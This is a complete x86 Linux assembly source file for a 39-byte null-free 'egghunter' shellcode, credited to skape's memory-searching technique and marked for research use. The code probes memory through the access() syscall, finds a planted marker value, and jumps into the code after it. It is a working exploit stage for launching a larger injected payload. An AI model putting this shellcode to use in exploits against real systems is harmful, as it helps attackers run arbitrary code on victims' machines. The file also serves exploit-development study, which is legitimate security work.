; Title: Linux Egghunter Shellcode
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

; Uses the access() syscall explained in skape's paper:
; "Safely Searching Process Virtual Address Space"

; Shellcode egghunter
; Size: 39 bytes
; Pros: fast, small, robust, null-free
; Cons: size, executable egg

global _start			

section .text
_start:
    mov ebx,0x50905090      ; EGG
    xor ecx,ecx             ; Zero out ECX
    mul ecx                 ; Zero out EAX, EDX
next_page:
    or dx,0xfff             ; Page allignment
next_addr:
    inc edx                 ; Try next valid address in the current page
    pusha                   ; Preserve general purpose registers across
    lea ebx,[edx+0x4]       ; 1st arg to access() - address being validated
                            ; Validate 8 bytes of contiguous memory
    mov al,0x21             ; access() system call number
    int 0x80                ; Execute syscall 
    cmp al,0xf2             ; Compare with EFAULT
    popa                    ; Restore general purpose registers
    jz short next_page      ; Jump to the next page
    cmp [edx],ebx           ; Pointer valid - compare for egg
    jnz short next_addr     ; Not found - go to next address in the current page
    cmp [edx+0x4],ebx       ; Compare again
    jnz short next_addr     ; Not found - go to next address in the current page
    jmp edx                 ; Egg found - start executing!

